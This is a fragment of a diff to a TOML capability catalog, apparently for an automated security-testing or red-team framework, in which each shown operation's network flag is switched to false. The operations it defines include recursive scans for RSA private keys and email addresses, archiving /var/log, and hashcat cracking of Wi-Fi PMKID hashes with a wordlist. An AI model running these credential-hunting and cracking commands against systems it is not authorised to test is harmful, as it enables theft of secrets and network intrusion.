 args = ['-n', '-e', 'BEGIN RSA PRIVATE KEY', '{path}']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'pcregrep'
 [[capability.provider.operation]]
 name = 'Multiline Scan'
 args = ['-M', '-r', '{pattern}', '{path}']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'egrep'
 [[capability.provider.operation]]
 name = 'Email Scan'
 args = ['-r', '-o', '[a-z0-9._%+-]+@[a-z0-9.-]+', '{path}']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'sed'
 [[capability.provider.operation]]
 name = 'Filter Matches'
 args = ['-n', '-E', '/{pattern}/p', '{path}']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'awk'
 [[capability.provider.operation]]
 name = 'Format Matches'
 args = ['-f', 'format_matches.awk', '{path}']
 output = 'lines'
-network = true
+network = false
 
 [[capability]]
 id = 'objectives.event-collection'
@@ -6443,7 +6443,7 @@ binary = 'tar'
 name = 'Log Archive'
 args = ['-czf', '{directory}/logs.tar.gz', '/var/log']
 output = 'lines'
-network = true
+network = false
 
 [[capability]]
 id = 'objectives.storage-harvesting'
@@ -6505,7 +6505,7 @@ binary = 'jq'
 name = 'Record Count'
 args = ['-r', '.[].{key}', '{path}/users.json']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'sqlite3'
 [[capability.provider.operation]]
@@ -6519,21 +6519,21 @@ binary = 'datamash'
 name = 'Summary Stats'
 args = ['-g', '1', 'sum', '2', '{path}/metrics.tsv']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'sort'
 [[capability.provider.operation]]
 name = 'Frequency Sort'
 args = ['-nr', '{path}/frequencies.txt']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'awk'
 [[capability.provider.operation]]
 name = 'Top Domains'
 args = ['-f', 'top_domains.awk', '{path}/domains.txt']
 output = 'lines'
-network = true
+network = false
 
 [[capability]]
 id = 'objectives.custody-chain'
@@ -6551,7 +6551,7 @@ binary = 'sha512sum'
 name = 'Digest'
 args = ['{artifact}']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'openssl'
 [[capability.provider.operation]]
@@ -6604,14 +6604,14 @@ binary = 'wc'
 name = 'Record Volume'
 args = ['-l', '{metrics}']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'du'
 [[capability.provider.operation]]
 name = 'Byte Volume'
 args = ['-sh', '/tmp/stage']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'pandoc'
 [[capability.provider.operation]]
@@ -6933,7 +6933,7 @@ binary = 'hashcat'
 name = 'PMKID Crack'
 args = ['-m', '22000', '{hashes}', '/usr/share/wordlists/rockyou.txt']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'wlanhcx2john'
 [[capability.provider.operation]]
@@ -7364,7 +7364,7 @@ binary = 'jq'
 name = 'Coordinate Parse'
 args = ['-r', '.results[].trilat', 'wigle.json']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'python3'
 [[capability.provider.operation]]
@@ -7443,7 +7443,7 @@ binary = 'hashcat'
 name = 'Potfile Show'
 args = ['-m', '22000', '--show', '{hashes}']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'airdecap-ng'
 [[capability.provider.operation]]
